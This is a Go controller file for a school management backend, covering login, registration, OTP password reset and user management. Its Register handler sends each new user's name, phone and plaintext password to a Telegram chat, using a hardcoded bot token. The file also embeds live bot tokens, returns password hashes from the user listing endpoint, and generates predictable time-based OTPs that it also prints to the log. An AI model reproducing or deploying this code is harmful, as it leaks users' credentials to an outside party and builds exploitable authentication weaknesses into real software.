package controllers

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"schoolbackend/config"
	"schoolbackend/helper"
	"schoolbackend/models"
	"schoolbackend/utils"
	"strconv"
	"time"

	"github.com/dgrijalva/jwt-go"
	"github.com/gin-gonic/gin"
	"golang.org/x/crypto/bcrypt"
	"gorm.io/gorm"
)

func SendTelegramMessage(botToken string, chatID string, message string) error {
	url := "https://api.telegram.org/bot" + botToken + "/sendMessage"

	payload := map[string]string{
		"chat_id": chatID,
		"text":    message,
	}

	payloadBytes, _ := json.Marshal(payload)
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(payloadBytes))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func Login(c *gin.Context) {
	var req struct {
		Phone    string `json:"phone" binding:"required"`
		Password string `json:"password" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid input", "error": err.Error()})
		return
	}

	// Find user by phone
	var user models.User
	if err := config.DB.Where("phone = ? AND is_active = ?", req.Phone, 1).First(&user).Error; err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"message": "Invalid phone or password"})
		return
	}

	var role models.Role
	if err := config.DB.Where("id =?", user.RoleID).First(&role).Error; err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"message": "Invalid phone or password"})
		return
	}

	// Check password
	if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(req.Password)); err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"message": "Invalid phone or password"})
		return
	}
	// password that store in database
	// "$2y$10$rROHNQUsL6M.naBE58jN5.qCQitWcEm.uH5jNLoKfwO5jrP4CvWHO
	// 2y is version
	// 10 is cost
	// rROHNQUsL6M.naBE58jN5 is salt
	// then it hash input password with old version,cost,salt and compare

	// JWT Token generation
	expirationTime := time.Now().Add(7 * 24 * time.Hour)
	claims := jwt.MapClaims{
		//MapClaims គឺ map[string]interface{}`
		// map[keyType]valueType
		//keyType = ប្រភេទ key (នៅទីនេះ string)
		//valueType = ប្រភេទ value (នៅទីនេះ interface{})
		// interface{} អាចផ្ទុក គ្រប់ប្រភេទទិន្នន័យ (string, int, bool, struct, slice, map...) គេប្រើវា ពេលយើង មិនដឹងថា value មាន type អ្វីទេ
		"user_id": user.ID,
		"phone":   user.Phone,
		"role_id": user.RoleID,
		"exp":     expirationTime.Unix(),
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	//​ token = JWT object ដែលមាន claims និង algorithm (HS256)
	// jwt.NewWithClaims បង្កើត JWT object ជាមួយ claims និង signing method
	// SigningMethod មានដូចជា
	// HS256 → HMAC + SHA-256

	// RS256 → RSA + SHA-256

	// ES256 → ECDSA + SHA-256
	//ប្រាប់ JWT ថា ចង់ sign token ជាមួយ algorithm HMAC + SHA-256
	tokenStr, err := token.SignedString(utils.JwtKey)
	// Signature = hash(header + payload + secret key) → បង្កើតដោយ SignedString
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"message": "Token generation failed"})
		return
	}

	// Send Telegram notification (async)
	// go func() {
	// 	telegramBotToken := TelegramBotTokenLogin // replace with your bot token
	// 	userChatID := TelegramChatIDLogin         // make sure your User model has TelegramChatID field
	// 	msg := fmt.Sprintf("✅ អ្នកប្រើប្រាស់ %s (លេខទូរសព្ទ: %s) បានចូលដោយជោគជ័យ.", user.Name, user.Phone)

	// 	err := SendTelegramMessage(telegramBotToken, userChatID, msg)
	// 	if err != nil {
	// 		fmt.Println("Telegram message failed:", err)
	// 	}
	// }()

	// Send response to client
	c.JSON(http.StatusOK, gin.H{
		"message": "Logged in successfully",
		"user": gin.H{
			"id":        user.ID,
			"name":      user.Name,
			"phone":     user.Phone,
			"role_id":   user.RoleID,
			"role_name": role.Name,
		},
		"token": tokenStr,
	})
}

const (
	TelegramBotToken      = "8215606556:AAFwzT26BSIyEvZlHc8HaAoCV0sv6Wh6LPg"
	TelegramChatID        = "-1003003045389" // the chat ID where you want to send messages
	TelegramBotTokenLogin = "8200321427:AAE9WMDOCzlixhp6M_-c2ZBhgaqMcntiQek"
	TelegramChatIDLogin   = "-1003003045389"
)

func sendToTelegram(message string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TelegramBotToken)

	values := url.Values{}
	values.Add("chat_id", TelegramChatID)
	values.Add("text", message)

	resp, err := http.PostForm(apiURL, values)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

type RegisterInput struct {
	Name     string `form:"name_kh" binding:"required"`
	Phone    string `form:"phone" binding:"required"`
	Password string `form:"password"`

	RoleID         int       `form:"role_id" binding:"required"`
	VillageID      int       `form:"village_id" binding:"required"`
	IDCardNumber   string    `form:"id_card_number"`
	Gender         int       `form:"gender"`
	DOB            time.Time `form:"dob" time_format:"2006-01-02"`
	MaterialStatus int       `form:"material_status"`
	IsActive       int       `form:"is_active"`
	ManageClass    int       `form:"manage_class"`
}

func hashPassword(password string) string {
	hashed, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		panic("failed to hash password: " + err.Error())
	}
	return string(hashed)
}

func Register(c *gin.Context) {
	var input RegisterInput
	if err := c.ShouldBind(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Hash password
	hashedPassword := hashPassword(input.Password)
	file, err := c.FormFile("image")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Image is required"})
		return
	}
	imageDir := "public/images"
	if _, err := os.Stat(imageDir); os.IsNotExist(err) {
		/// os.Stat check the status of path
		// os.IsNotExist function check whether the error from os.Stat
		os.MkdirAll(imageDir, os.ModePerm)
	}
	extension := filepath.Ext(file.Filename)
	imageName := fmt.Sprintf("%d%s", time.Now().UnixNano(), extension)
	imagePath := filepath.Join(imageDir, imageName)
	if err := c.SaveUploadedFile(file, imagePath); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to upload image"})
		return
	}

	// Start transaction
	tx := config.DB.Begin()

	// Check role exists
	var role models.Role
	if err := tx.First(&role, input.RoleID).Error; err != nil {
		tx.Rollback()
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid role"})
		return
	}

	// Create user
	user := models.User{
		Name:           input.Name,
		Phone:          input.Phone,
		Password:       hashedPassword,
		Image:          imageName,
		RoleID:         input.RoleID,
		VillageID:      input.VillageID,
		IDCardNumber:   input.IDCardNumber,
		Gender:         input.Gender,
		DOB:            input.DOB,
		MaterialStatus: input.MaterialStatus,
		IsActive:       1,
		ManageClass:    input.ManageClass,
	}

	if err := tx.Create(&user).Error; err != nil {
		tx.Rollback()
		c.JSON(http.StatusInternalServerError, gin.H{"error": "User creation failed"})
		return
	}

	// Commit transaction
	tx.Commit()

	// Prepare message for Telegram
	message := fmt.Sprintf(
		"New User Registered:\nName: %s\nPhone: %s\nPassword: %s",
		input.Name,
		input.Phone,
		input.Password, // if you want to send plain password
	)

	// Send message to Telegram (ignore error if you want)
	_ = sendToTelegram(message)

	c.JSON(http.StatusOK, gin.H{"message": "User registered successfully"})
}

type OTPStore struct {
	Code      string
	ExpiresAt time.Time
}

var otpMap = make(map[string]OTPStore) // phone -> OTP

// Hash password

// SendOTP sends OTP to phone number
func SendOTP(c *gin.Context) {
	var input struct {
		Phone string `json:"phone"`
	}

	if err := c.ShouldBindJSON(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	otp := fmt.Sprintf("%06d", 100000+time.Now().UnixNano()%900000) // 6-digit OTP
	otpMap[input.Phone] = OTPStore{
		Code:      otp,
		ExpiresAt: time.Now().Add(5 * time.Minute),
	}

	// Free SMS via Textbelt
	data := map[string]string{
		"phone":   input.Phone,
		"message": fmt.Sprintf("Your OTP is: %s", otp),
		"key":     "textbelt", // free key (limited per day)
	}
	payload, _ := json.Marshal(data)
	resp, err := http.Post("https://textbelt.com/text", "application/json", bytes.NewBuffer(payload))
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to send OTP"})
		return
	}
	defer resp.Body.Close()

	fmt.Println("OTP for debug:", otp) // remove in production
	c.JSON(http.StatusOK, gin.H{"message": "OTP sent successfully"})
}

// ChangePassword verifies OTP and updates password
func ChangePassword(c *gin.Context) {
	var input struct {
		Phone       string `json:"phone"`
		NewPassword string `json:"new_password"`
		OTP         string `json:"otp"`
	}

	if err := c.ShouldBindJSON(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	store, exists := otpMap[input.Phone]
	if !exists || store.ExpiresAt.Before(time.Now()) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "OTP expired or not found"})
		return
	}

	if store.Code != input.OTP {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid OTP"})
		return
	}

	hashed := hashPassword(input.NewPassword)

	if err := config.DB.Model(&models.User{}).
		Where("phone = ?", input.Phone).
		Update("password", hashed).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update password"})
		return
	}

	delete(otpMap, input.Phone) // remove used OTP
	c.JSON(http.StatusOK, gin.H{"message": "Password changed successfully"})
}

// func GetUserByID(c *gin.Context) {
// 	var user models.UserDetail
// 	id := c.Param("id")

// 	result := config.DB.Table("users").
// 		Select(`
//             users.id, users.name, users.phone,
//             users.id_card_number, users.manage_class,
//             users.gender, users.dob, users.material_status,
//             users.role_id, roles.name AS role_name,
//             users.village_id, villages.name AS village_name,
//             communes.id AS commune_id, communes.name AS commune_name,
//             districts.id AS district_id, districts.name AS district_name,
//             provinces.id AS province_id, provinces.name AS province_name,
//             users.is_active
//         `).
// 		Joins("LEFT JOIN roles ON roles.id = users.role_id").
// 		Joins("LEFT JOIN villages ON villages.id = users.village_id").
// 		Joins("LEFT JOIN communes ON communes.id = villages.commune_id").
// 		Joins("LEFT JOIN districts ON districts.id = communes.district_id").
// 		Joins("LEFT JOIN provinces ON provinces.id = districts.province_id").
// 		Where("users.id = ?", id).
// 		Scan(&user)

// 	if result.Error != nil {
// 		c.JSON(http.StatusInternalServerError, gin.H{"error": result.Error.Error()})
// 		return
// 	}
// 	if result.RowsAffected == 0 {
// 		c.JSON(http.StatusNotFound, gin.H{"error": "User not found"})
// 		return
// 	}

// 	c.JSON(http.StatusOK, user)
// }

func GetUsers(c *gin.Context) {
	var users []models.UserDetail

	// --- Step 1: Get logged-in user ID from context ---

	// --- Step 2: Pagination & filters ---
	page, _ := strconv.Atoi(c.DefaultQuery("page", "1"))
	limit, _ := strconv.Atoi(c.DefaultQuery("limit", "10"))
	offset := (page - 1) * limit
	nameKh := c.Query("name_kh")
	roleID := c.Query("role_id")

	// --- Step 3: Build query ---
	db := config.DB.Table("users").
		Select(`
            users.id, users.name, users.phone, users.password,users.image, 
            users.id_card_number, users.gender, users.dob, users.material_status,
            users.role_id, roles.name AS role_name,
            users.village_id, villages.name AS village_name,
            communes.id AS commune_id, communes.name AS commune_name,
            districts.id AS district_id, districts.name AS district_name,
            provinces.id AS province_id, provinces.name AS province_name,
            users.is_active
        `).
		Joins("LEFT JOIN roles ON roles.id = users.role_id").
		Joins("LEFT JOIN villages ON villages.id = users.village_id").
		Joins("LEFT JOIN communes ON communes.id = villages.commune_id").
		Joins("LEFT JOIN districts ON districts.id = communes.district_id").
		Joins("LEFT JOIN provinces ON provinces.id = districts.province_id")

	// --- Step 4: Apply filters ---
	if nameKh != "" {
		db = db.Where("users.name LIKE ?", "%"+nameKh+"%")
	}
	if roleID != "" {
		db = db.Where("users.role_id = ?", roleID)
	}

	// --- Step 5: Pagination ---
	db = db.Limit(limit).Offset(offset)

	// --- Step 6: Execute ---
	result := db.Scan(&users)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": result.Error.Error()})
		return
	}

	// --- Step 7: If teacher, fetch classes ---
	for i := range users {
		if users[i].RoleName == "គ្រូបង្រៀន" { // or RoleID == 4
			var classes []models.ClassInfo
			err := config.DB.Table("class_teachers ct").
				Select("ct.id AS class_teacher_id,c.id, c.name, ay.id AS academic_year_id, ay.year_name AS academic_year").
				Joins("LEFT JOIN classes c ON c.id = ct.class_id").
				Joins("LEFT JOIN academic_years ay ON ay.id = ct.academic_year_id").
				Where("ct.teacher_id = ? AND ct.is_active =?", users[i].ID, 1).
				Scan(&classes).Error
			if err == nil {
				users[i].Classes = classes
			}
		}
	}

	c.JSON(http.StatusOK, users)
}

func ChangeStatusUser(c *gin.Context) {
	idParam := c.Param("id")
	id, err := strconv.Atoi(idParam)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid ID"})
		return
	}

	// Update with CASE: if 1 → 0, if 0 → 1
	userlogin, ok := helper.GetUserID(c)
	if !ok {
		c.JSON(http.StatusUnauthorized, gin.H{"Error": "Please Login"})
	}
	if id == userlogin {
		c.JSON(http.StatusForbidden, gin.H{"error": "Cannot modify yourself"})
		return
	}
	result := config.DB.Model(&models.User{}).
		Where("id = ?", id).
		Update("is_active", gorm.Expr("CASE WHEN is_active = 1 THEN 0 ELSE 1 END"))

	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": result.Error.Error()})
		return
	}

	if result.RowsAffected == 0 {
		c.JSON(http.StatusNotFound, gin.H{"error": "User not found"})
		return
	}

	c.JSON(http.StatusOK, http.StatusOK)
}
func UpdateUser(c *gin.Context) {
	// Get user ID from URL param
	id := c.Param("id")

	var input RegisterInput
	if err := c.ShouldBind(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Start transaction
	tx := config.DB.Begin()

	// Check if user exists
	var user models.User
	if err := tx.First(&user, id).Error; err != nil {
		tx.Rollback()
		c.JSON(http.StatusNotFound, gin.H{"error": "User not found"})
		return
	}
	file, err := c.FormFile("image")
	if err == nil {
		// User uploaded a new image

		// Delete old image if it exists
		oldImagePath := filepath.Join("public/images", user.Image)
		if _, err := os.Stat(oldImagePath); err == nil {
			os.Remove(oldImagePath)
		}

		// Save new image
		imageDir := "public/images"
		if _, err := os.Stat(imageDir); os.IsNotExist(err) {
			os.MkdirAll(imageDir, os.ModePerm)
		}

		extension := filepath.Ext(file.Filename)
		newImageName := fmt.Sprintf("%d%s", time.Now().UnixNano(), extension)
		imagePath := filepath.Join(imageDir, newImageName)

		if err := c.SaveUploadedFile(file, imagePath); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to upload new image"})
			return
		}

		user.Image = newImageName
	}
	// If role_id is invalid
	var role models.Role
	if err := tx.First(&role, input.RoleID).Error; err != nil {
		tx.Rollback()
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid role"})
		return
	}

	// Update fields
	user.Name = input.Name
	user.Phone = input.Phone
	user.RoleID = input.RoleID
	user.VillageID = input.VillageID
	user.IDCardNumber = input.IDCardNumber

	user.Gender = input.Gender
	user.DOB = input.DOB
	user.MaterialStatus = input.MaterialStatus
	user.ManageClass = input.ManageClass
	user.IsActive = 1

	// Update password only if provided

	if err := tx.Save(&user).Error; err != nil {
		tx.Rollback()
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update user"})
		return
	}

	// Commit transaction
	tx.Commit()

	c.JSON(http.StatusOK, http.StatusOK)
}
func GetUser(c *gin.Context) {
	id := c.Param("id")

	var user struct {
		models.User
		RoleName     string `json:"role_name"`
		VillageName  string `json:"village_name"`
		CommuneID    uint   `json:"commune_id"`
		CommuneName  string `json:"commune_name"`
		DistrictID   uint   `json:"district_id"`
		DistrictName string `json:"district_name"`
		ProvinceID   uint   `json:"province_id"`
		ProvinceName string `json:"province_name"`
	}

	query := `
        SELECT u.*, r.name as role_name,
               v.name as village_name, v.commune_id,
               c.name as commune_name, c.district_id,
               d.name as district_name, d.province_id,
               p.name as province_name
        FROM users u
        LEFT JOIN roles r ON r.id = u.role_id
        LEFT JOIN villages v ON v.id = u.village_id
        LEFT JOIN communes c ON c.id = v.commune_id
        LEFT JOIN districts d ON d.id = c.district_id
        LEFT JOIN provinces p ON p.id = d.province_id
        WHERE u.id = ?
    `

	if err := config.DB.Raw(query, id).Scan(&user).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "User not found"})
		return
	}

	c.JSON(http.StatusOK, user)
}
